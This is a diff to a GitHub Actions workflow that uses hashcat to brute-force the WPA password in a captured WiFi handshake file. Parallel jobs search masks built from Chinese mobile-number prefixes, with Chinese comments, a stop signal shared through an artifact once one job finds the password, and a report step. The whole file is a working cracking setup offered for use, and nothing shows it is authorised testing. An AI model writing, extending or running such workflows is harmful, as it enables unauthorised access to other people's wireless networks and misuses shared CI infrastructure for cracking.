@@ -22,19 +22,82 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
+      - name: Check if password already found
+        run: |
+          gh run download --name found --dir found_dir || true
+          if [ -f found_dir/found.txt ]; then
+            echo "Password already found by another job. Exiting."
+            exit 0
+          fi
+
       - name: Install hashcat
         run: |
           sudo apt-get update
           sudo apt-get install -y hashcat
 
-      - name: Run mask attack
+      - name: Create Guangxi + Guangdong prefix7 list
         run: |
-          hashcat -m 22000 -a 3 \
-            hs/wifi-02.hc22000 \
-            "${{ matrix.prefix }}?d?d?d?d?d?d?d?d?d?d?d" \
-            -o result_${{ matrix.prefix }}.txt \
-            --status --status-timer=60 \
-            --potfile-disable || true
+          cat > prefix7.txt << 'EOF'
+1380771
+1380772
+1380773
+1380774
+1380775
+1380776
+1380777
+1380778
+1380779
+1590771
+1590772
+1590773
+1590774
+1590775
+1590776
+1590777
+1590778
+1590779
+1470771
+1470772
+1470773
+1470774
+1470775
+1470776
+1470777
+1470778
+1470779
+EOF
+
+      - name: Run mask attack for all prefix7
+        run: |
+          while read p; do
+
+            # 每轮开始前检查是否已经找到密码
+            gh run download --name found --dir found_dir || true
+            if [ -f found_dir/found.txt ]; then
+              echo "Password already found. Exiting job."
+              exit 0
+            fi
+
+            # 跑 mask
+            hashcat -m 22000 -a 3 \
+              hs/wifi-02.hc22000 \
+              "${{ matrix.prefix }}$p?d?d?d?d" \
+              -o result_${{ matrix.prefix }}.txt \
+              --append-output \
+              --status --status-timer=60 \
+              --potfile-disable || true
+
+            # 如果找到密码 → 上传 found.txt → 触发全局停止
+            if [ -s result_${{ matrix.prefix }}.txt ]; then
+              echo "Password found!"
+              mkdir found
+              cp result_${{ matrix.prefix }}.txt found/found.txt
+
+              gh run upload-artifact --name found --path found/found.txt
+              exit 0
+            fi
+
+          done < prefix7.txt
 
       - name: Ensure result exists
         run: |
@@ -56,32 +119,19 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - name: Download all results
+      - name: Try to download found password
         uses: actions/download-artifact@v4
         with:
-          pattern: results_*
-          merge-multiple: true
-
-      - name: Merge results
-        run: |
-          cat result_*.txt 2>/dev/null > all_results.txt || true
+          name: found
+        continue-on-error: true
 
       - name: Generate report
         run: |
-          echo "Job count:   52" > report.txt
-          echo "Mask:        [a-zA-Z] + 11 digits" >> report.txt
-          echo "Timestamp:   $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> report.txt
-          echo "" >> report.txt
-
-          if [ -s all_results.txt ]; then
-            echo "Status:      PASSWORD FOUND" >> report.txt
-            echo "" >> report.txt
-            echo "Passwords:" >> report.txt
-            cat all_results.txt >> report.txt
+          if [ -f found.txt ]; then
+            echo "PASSWORD FOUND" > report.txt
+            cat found.txt >> report.txt
           else
-            echo "Status:      PASSWORD NOT FOUND" >> report.txt
-            echo "" >> report.txt
-            echo "No password found in the entire mask space." >> report.txt
+            echo "PASSWORD NOT FOUND" > report.txt
           fi
 
       - name: Upload report
